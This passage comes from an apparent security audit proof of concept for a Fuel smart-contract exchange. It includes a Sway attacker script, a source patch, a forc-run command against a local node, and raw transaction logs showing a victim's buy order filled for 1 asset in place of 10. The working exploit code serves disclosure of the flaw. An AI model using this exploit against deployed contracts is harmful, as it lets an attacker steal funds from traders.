9b7af8acff77155cd6e36e08","is":42304,"len":280,"pc":89124,"ptr":66987867,"ra":0,"rb":13895587280595317858}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":42304,"len":0,"pc":56508,"ptr":0}},{"LogData":{"data":"0000000000000001","digest":"cd2662154e6d76b2b2b92e70c0cac3ccf534f9b74eb5b89819ec509083d00a50","id":"0000000000000000000000000000000000000000000000000000000000000000","is":10368,"len":8,"pc":20508,"ptr":66986843,"ra":0,"rb":1515152261580153489}},{"LogData":{"data":"400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6","digest":"035dca2b7af182968733604e55e6e554014ab20f469f2434e2b4b8f03898fe6e","id":"0000000000000000000000000000000000000000000000000000000000000000","is":10368,"len":32,"pc":20732,"ptr":66985819,"ra":0,"rb":17696813611398264200}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"0000000000000000000000000000000000000000000000000000000000000000","is":10368,"len":0,"pc":10484,"ptr":66984795}},{"ScriptResult":{"gas_used":2156787,"result":"Success"}}]
```

From the log output, we retrieve the victim's account and nonce, which are:

```
Account: 0x400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6
Nonce: 0x0000000000000001
```

After running the setup script, the account balances of the attacker and victim are as follows: both accounts initially have 1152921504606846976. The victim placed a buy order with a price of 10, reducing the victim's balance to 1152921504606846966.

```
---------------------------------------------------------------------------
Account 0: fuel16r69m48pwg4c8dtlnpze2m95t2fws4vwdju7w7sm9ztj459c0ekqs6xjg5

Asset ID : f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07
Amount   : 1152921504606846976
---------------------------------------------------------------------------
Account 1: fuel1gq9fak7588gs0hk8yuun95hpmaahldy6204h2v37945kazug46mqz682vm

Asset ID : f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07
Amount   : 1152921504606846966
---------------------------------------------------------------------------
```

### Attacker Script

This script demonstrates how an attacker can take the previously placed order by the victim, providing only 1 base asset instead of the 10 base assets required by the victim in their buy order.

> The collection (`0x7e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c`) and `token_id` (0) correspond to the default base asset (`f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07`).

> Note the deployed contract addresses are hardcoded in the main function, so you'll need to replace them with your own deployed contract addresses. Additionally, the victim's address and nonce are taken from the previous output; make sure to update these values accordingly.

Forc.toml

```toml
[project]
authors = ["anatomist"]
entry = "main.sw"
license = "Apache-2.0"
name = "POC"

[dependencies]
interfaces = {path = "../interfaces"}
libraries = {path = "../libraries"}
```

src/main.sw

```rust
script;

use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
    asset_manager_interface::*,
    execution_manager_interface::ExecutionManager,
    execution_strategy_interface::*,
    pool_interface::Pool,
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
    ownable::*,
};

use std::{
    block::timestamp,
    auth::*,
    call_frames::*,
    context::*,
    contract_id::ContractId,
    logging::log,
    revert::require,
    storage::storage_map::*,
    asset::*
};

fn attack(
    thunder_exchange: ContractId,
    victim: Address,
    nonce: u64,
){
    let thunder_exchange_abi = abi(ThunderExchange, thunder_exchange.into());

    let thunder_exchange_abi = abi(ThunderExchange, thunder_exchange.into());
    let execute_manager = thunder_exchange_abi.get_execution_manager();
    let execute_manager_abi = abi(ExecutionManager, execute_manager.into());
    let fixed_strategy = execute_manager_abi.get_whitelisted_strategy(0).unwrap();

    let taker_oder: TakerOrder = TakerOrder {
        side: Side::Sell,
        taker: caller_address().unwrap(),
        maker: victim,
        collection: ContractId::from(0x7e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c),
        token_id: SubId::zero(),
        price: 10,
        nonce: nonce,
        strategy: fixed_strategy,
        extra_params: ExtraParams {
            extra_address_param: Address::zero(),
            extra_contract_param: ContractId::zero(),
            extra_u64_param: 0,
        },
    };
    thunder_exchange_abi.execute_order{asset_id: AssetId::base().into(), coins: 1}(taker_oder);
}

fn main() {
    let thunder_exchange = ContractId::from(0xa39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08);
    attack(
        thunder_exchange,
        Address::from(0x400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6),
        1,
    )
}
```

### Running Attacker Script

Before running the attacker script, we need to patch `contracts-v1/libraries/src/order_types.sw`. Making `ExtraParams` public will simplify our exploit script.

```diff
diff --git a/contracts-v1/libraries/src/order_types.sw b/contracts-v1/libraries/src/order_types.sw
index fba6f60..f01bfb0 100644
--- a/contracts-v1/libraries/src/order_types.sw
+++ b/contracts-v1/libraries/src/order_types.sw
@@ -34,7 +34,7 @@ impl core::ops::Eq for TokenType {
     }
 }

-struct ExtraParams {
+pub struct ExtraParams {
     pub extra_address_param: Address,
     pub extra_contract_param: ContractId,
     pub extra_u64_param: u64,
```

Use the following command with the patched `forc-run` and the attacker account's private key to execute the attack script.

> Note that we are using the contract addresses from the deployment output above.

```bash
./target/release/forc-run 306a75f0093834948e363ece5ba1b5a7eaad99f2fc9ab976ba01c2dbea3320f6 \
 --script-gas-limit 10000000 --node-url http://localhost:4000/v1/graphql \
 --contract 0xa39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08 \
 --contract 0xb2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec \
 --contract 0x380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02 \
 --contract 0xe7d76b39fecc40866346e0415467e392ebfd7e4f2c45133ea9703db759a4d221 \
 --contract 0xd3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488 \
 --contract 0xf6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a 
```

Upon running the attack script, you should see an output similar to the following:

```json
[{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9977251,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":27896,"param1":67107840,"param2":67106816,"pc":27896,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"ReturnData":{"data":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02","digest":"1bcb83b3a3c6b1a7794fc43d6603001e3cbff4ef28b21b95da4afa69d6b456f6","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":27896,"len":32,"pc":37036,"ptr":67104256}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9954682,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":27896,"param1":67103232,"param2":67102208,"pc":27896,"to":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02"}},{"ReturnData":{"data":"0000000000000001f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a","digest":"652764e2359de65beaaf013fc72c00378962b6cf87d32683fdb67149b3a43149","id":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02","is":27896,"len":40,"pc":30336,"ptr":67099168}},{"Call":{"amount":1,"asset_id":"f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07","gas":9915115,"id":"0000000000000000000000000000000000000000000000000000000000000000","is":27896,"param1":67098144,"param2":67097120,"pc":27896,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9890474,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":104472,"param1":67094560,"param2":67093536,"pc":104472,"to":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"380620ea03bc23072038b5834e60512b7b3cfc82b7ebd43c23079b7ce28f6a02","is":104472,"len":1,"pc":107568,"ptr":67090976}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9861217,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":104912,"param1":67089952,"param2":67088928,"pc":104912,"to":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a"}},{"ReturnData":{"data":"017e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83c00000000000000000000000000000000000000000000000000000000000000000000000000000001f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07","digest":"3f5ba8ec7f4eec203bd6b02f1caa89b202dcccd38d59b03d266e661a4d63a50c","id":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a","is":104912,"len":105,"pc":106660,"ptr":67080000}},{"TransferOut":{"amount":1,"asset_id":"f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":27896,"pc":55908,"to":"400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb6"}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9625900,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":104088,"param1":67078464,"param2":67077440,"pc":104088,"to":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488"}},{"LogData":{"data":"0000000000000000400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb60000000000000001a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07000000000000000a","digest":"3487626624d12491ef0e4b0e9d8d570c68a7fb599931cf24de5e39f741301de0","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":104088,"len":120,"pc":130168,"ptr":67071524,"ra":0,"rb":14880471643791846054}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":104088,"len":1,"pc":108788,"ptr":67070500}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9502909,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":104088,"param1":67069476,"param2":67068452,"pc":104088,"to":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488"}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9472929,"id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":142752,"param1":67065053,"param2":67064029,"pc":142752,"to":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec"}},{"ReturnData":{"data":"01","digest":"4bf5122f344554c53bde2ebb8cd2b7e3d1600ad631c385a5d7cce23c7785459a","id":"b2efa91fb0884bc2702afa7143058adf7aad440e0affe367fc49d056c577c0ec","is":142752,"len":1,"pc":146944,"ptr":67061469}},{"Transfer":{"amount":10,"asset_id":"f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":104088,"pc":124672,"to":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08"}},{"LogData":{"data":"0000000000000001a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07000000000000000a","digest":"ebffbd0981f60cbdc7f0fd9555624b9dbe34566c8dcadbfa9ca05c215d9c2685","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":104088,"len":80,"pc":131088,"ptr":67059606,"ra":0,"rb":13279905576758129435}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"d3a092dbe09ba7d55271de777f311afa6b204c90696560b8f88017b9954ae488","is":104088,"len":0,"pc":109884,"ptr":0}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9376699,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":104568,"param1":67058582,"param2":67057558,"pc":104568,"to":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a"}},{"ReturnData":{"data":"0000000000000000","digest":"af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc","id":"f6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a","is":104568,"len":8,"pc":110024,"ptr":67055254}},{"Call":{"amount":0,"asset_id":"0000000000000000000000000000000000000000000000000000000000000000","gas":9351420,"id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":104896,"param1":67053206,"param2":67052182,"pc":104896,"to":"e7d76b39fecc40866346e0415467e392ebfd7e4f2c45133ea9703db759a4d221"}},{"ReturnData":{"data":"0000000000000000","digest":"af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc","id":"e7d76b39fecc40866346e0415467e392ebfd7e4f2c45133ea9703db759a4d221","is":104896,"len":8,"pc":106980,"ptr":67049110}},{"TransferOut":{"amount":10,"asset_id":"f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":27896,"pc":55908,"to":"d0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c"}},{"LogData":{"data":"0000000000000001d0f45dd4e1722b83b57f9845956cb45a92e8558e6cb9e77a1b28972ad0b87e6c400a9edbd439d107dec7273932d2e1df7b7fb49a53eb75323e2d696e8b88aeb60000000000000001000000000000000a00000000000000000000000000000000000000000000000000000000000000007e2becd64cd598da59b4d1064b711661898656c6b1f4918a787156b8965dc83cf6ed9a267bcc4c7ec119cd15416abe3830c30188a50dc7bd5b5cfa8b6a655b2a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","digest":"812d264a29ceef64bc7ce23337cef4c285921ec6ce2821c87923e6312c515ec6","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":27896,"len":256,"pc":36224,"ptr":67048086,"ra":0,"rb":16905867214671608396}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"a39046092ba23b6340405f2a62c0632c241a1e8a9b7af8acff77155cd6e36e08","is":27896,"len":0,"pc":36232,"ptr":0}},{"ReturnData":{"data":"","digest":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","id":"0000000000000000000000000000000000000000000000000000000000000000","is":10368,"len":0,"pc":10484,"ptr":67047062}},{"ScriptResult":{"gas_used":679607,"result":"Success"}}]
```

After running the attacker script, we can see that the order is successfully taken with only 1 base asset. As a result, the attacker's balance increases by 9 to 1152921504606846985, while the victim loses 9 base assets.

```
---------------------------------------------------------------------------
Account 0: fuel16r69m48pwg4c8dtlnpze2m95t2fws4vwdju7w7sm9ztj459c0ekqs6xjg5

Asset ID : f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07
Amount   : 1152921504606846985
---------------------------------------------------------------------------
Account 1: fuel1gq9fak7588gs0hk8yuun95hpmaahldy6204h2v37945kazug46mqz682vm

Asset ID : f8f8b6283d7fa5b672b530cbb84fcccb4ff8dc40f8176ef4544ddb1f1952ad07
Amount   : 1152921504606846967
---------------------------------------------------------------------------
```
